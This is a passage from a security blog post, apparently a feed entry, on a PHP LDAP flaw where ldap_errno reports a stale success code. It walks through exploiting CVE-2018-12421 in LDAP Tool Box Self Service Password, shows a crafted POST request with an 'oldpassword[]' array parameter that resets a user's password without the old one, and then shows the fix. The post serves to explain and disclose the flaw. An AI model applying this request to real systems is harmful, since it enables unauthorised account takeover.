class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>The script connects to the local LDAP server and then executes three different bind, the first one with a wrong password, the second one with the correct password but with the last one we pass an array as password argument. Curious about the results? Just take a look.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Bind 1</span><br><span class="line">ldap_bind return: </span><br><span class="line">ldap_errno return: 49</span><br><span class="line"></span><br><span class="line">Bind 2</span><br><span class="line">ldap_bind return: 1</span><br><span class="line">ldap_errno return: 0</span><br><span class="line"></span><br><span class="line">Bind 3</span><br><span class="line">ldap_bind return: </span><br><span class="line">ldap_errno return: 0</span><br></pre></td></tr></table></figure><p>Wow, this is very strange, right? Let’s analyze what happened. Accordlying with <a href="https://ldapwiki.com/wiki/LDAP%20Result%20Codes">official LDAP return codes</a>, in the first bind we received code 49 because the authentication failed, on the second one we received code 0 because the authentication was successful and on the last one we got the same behaviour as the previous scenario but we sent an array containing the string “a”, so we just “logged in” successfully to the LDAP server without knowing the password!</p><p>How can this be possible? Well, if you pay attention to the <em>ldap_errno</em> description, you will notice that the return value is about the <strong>LAST</strong> LDAP command, so if we first bind successfully to the LDAP server and then we bind again passing an array as password argument in the <em>ldap_bind</em> function, something breaks in the PHP function, the bind will not be executed and <em>ldap_errno</em> returns the previous code, which is 0 in this case (LDAP_SUCCESS).</p><h1 id="Exploit-the-bug"><a href="#Exploit-the-bug" class="headerlink" title="Exploit the bug"></a>Exploit the bug</h1><p>How can this bug be exploited in a real scenario? There is a <a href="https://nvd.nist.gov/vuln/detail/CVE-2018-12421">CVE-2018-12421</a> which says that “LTB (aka LDAP Tool Box) Self Service Password before 1.3 allows a change to a user password (without knowing the old password) via a crafted POST request, because the ldap_bind return value is mishandled and the PHP data type is not constrained to be a string.”</p><p>Unfortunatelly there were no Proof of Concept code, so I started analyzing the <a href="https://github.com/ltb-project/self-service-password">source code</a> on Github and I deployed the application on my local environment, also I created two users on the local LDAP server.</p><p><img src="/2020/10/02/Break-the-PHP-LDAP-functions/self_service_password.png"></p><p><img src="/2020/10/02/Break-the-PHP-LDAP-functions/php_ldap_admin.png"></p><p>Looking at the source code of “Self Service Passord” <em>change.php</em> file, notice that when an user wants to change his password the following PHP code is executed:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Bind with old password</span></span><br><span class="line">$bind = ldap_bind($ldap, $userdn, $oldpassword);</span><br><span class="line">$errno = ldap_errno($ldap);</span><br><span class="line"><span class="keyword">if</span> ( ($errno == <span class="number">49</span>) &amp;&amp; $ad_mode ) &#123;</span><br><span class="line">    <span class="keyword">if</span> ( ldap_get_option($ldap, <span class="number">0x0032</span>, $extended_error) ) &#123;</span><br><span class="line">        error_log(<span class="string">&quot;LDAP - Bind user extended_error <span class="subst">$extended_error</span>  (&quot;</span>.ldap_error($ldap).<span class="string">&quot;)&quot;</span>);</span><br><span class="line">        $extended_error = explode(<span class="string">&#x27;, &#x27;</span>, $extended_error);</span><br><span class="line">        <span class="keyword">if</span> ( strpos($extended_error[<span class="number">2</span>], <span class="string">&#x27;773&#x27;</span>) <span class="keyword">or</span> strpos($extended_error[<span class="number">0</span>], <span class="string">&#x27;NT_STATUS_PASSWORD_MUST_CHANGE&#x27;</span>) ) &#123;</span><br><span class="line">            error_log(<span class="string">&quot;LDAP - Bind user password needs to be changed&quot;</span>);</span><br><span class="line">            $errno = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( ( strpos($extended_error[<span class="number">2</span>], <span class="string">&#x27;532&#x27;</span>) <span class="keyword">or</span> strpos($extended_error[<span class="number">0</span>], <span class="string">&#x27;NT_STATUS_ACCOUNT_EXPIRED&#x27;</span>) ) <span class="keyword">and</span> $ad_options[<span class="string">&#x27;change_expired_password&#x27;</span>] ) &#123;</span><br><span class="line">            error_log(<span class="string">&quot;LDAP - Bind user password is expired&quot;</span>);</span><br><span class="line">            $errno = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">unset</span>($extended_error);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ( $errno ) &#123;</span><br><span class="line">    $result = <span class="string">&quot;badcredentials&quot;</span>;</span><br><span class="line">    error_log(<span class="string">&quot;LDAP - Bind user error <span class="subst">$errno</span>  (&quot;</span>.ldap_error($ldap).<span class="string">&quot;)&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment"># Rebind as Manager if needed</span></span><br><span class="line">    <span class="keyword">if</span> ( $who_change_password == <span class="string">&quot;manager&quot;</span> ) &#123;</span><br><span class="line">        $bind = ldap_bind($ldap, $ldap_binddn, $ldap_bindpw);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">REDACTED</span><br><span class="line"><span class="comment">#==============================================================================</span></span><br><span class="line"><span class="comment"># Change password</span></span><br><span class="line"><span class="comment">#==============================================================================</span></span><br><span class="line"><span class="keyword">if</span> ( $result === <span class="string">&quot;&quot;</span> ) &#123;</span><br><span class="line">    $result = change_password($ldap, $userdn, $newpassword, $ad_mode, $ad_options, $samba_mode, $samba_options, $shadow_options, $hash, $hash_options, $who_change_password, $oldpassword);</span><br><span class="line">    <span class="keyword">if</span> ( $result === <span class="string">&quot;passwordchanged&quot;</span> &amp;&amp; <span class="keyword">isset</span>($posthook) ) &#123;</span><br><span class="line">        $command = escapeshellcmd($posthook).<span class="string">&#x27; &#x27;</span>.escapeshellarg($login).<span class="string">&#x27; &#x27;</span>.escapeshellarg($newpassword).<span class="string">&#x27; &#x27;</span>.escapeshellarg($oldpassword);</span><br><span class="line">        exec($command);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Do you notice something strange? There is no check on <em>ldap_bind</em> return value but only on <em>ldap_errno</em> return code, so we can exploit the vulnerability as described before.</p><p>Let’s try to reset the <em>user1</em> password, fill the form with a random string on old password field and set a new password, then intercept the POST request with Burpsuite and rename <em>oldpassword</em> parameter in <em>oldpassword[]</em>.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: localhost:8085</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (X11; Linux x86_64; rv:68.0) Gecko&#x2F;20100101 Firefox&#x2F;68.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: en-US,en;q&#x3D;0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: http:&#x2F;&#x2F;localhost:8085&#x2F;</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 87</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: io&#x3D;-SsYhdOEks7tGmK7AAAF; 5d89dac18813e15aa2f75788275e3588&#x3D;65si85gbdnrttukdp17v6s5uek; collapsedNodes&#x3D;</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">login&#x3D;user1&amp;oldpassword[]&#x3D;idontknow&amp;newpassword&#x3D;password1234&amp;confirmpassword&#x3D;password1234</span><br></pre></td></tr></table></figure><p>Yes, it happened!<br><img src="/2020/10/02/Break-the-PHP-LDAP-functions/password_reset_1.png"><br>Check on phpLDAPadmin if the password was correctly resetted.<br><img src="/2020/10/02/Break-the-PHP-LDAP-functions/password_reset_2.png"></p><h1 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h1><p>There are a lot of softwares which check only <em>ldap_errno</em> return code without see if the bind is correctly executed.</p><p>There is one last question left: how did they fix the vulnerability? Well, they just check the return code of <em>ldap_bind</em> now.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( !$bind ) &#123;</span><br><span class="line">    $result = <span class="string">&quot;ldaperror&quot;</span>;</span><br><span class="line">    $errno = ldap_errno($ldap);</span><br><span class="line">    <span class="keyword">if</span> ( $errno ) &#123;</span><br><span class="line">    error_log(<span class="string">&quot;LDAP - Bind error <span class="subst">$errno</span>  (&quot;</span>.ldap_error($ldap).<span class="string">&quot;)&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;What-is-LDAP&quot;&gt;&lt;a href=&quot;#What-is-LDAP&quot; class=&quot;headerlink&quot; title=&quot;What is LDAP?&quot;&gt;&lt;/a&gt;What is LDAP?&lt;/h1&gt;&lt;p&gt;LDAP is the Lightweight Directory Access Protocol, and is a protocol used to access “Directory Servers”. The Directory is a special kind of database that holds information in a tree structure.&lt;/p&gt;</summary>
    
    
    
    
  </entry>
  
</feed>
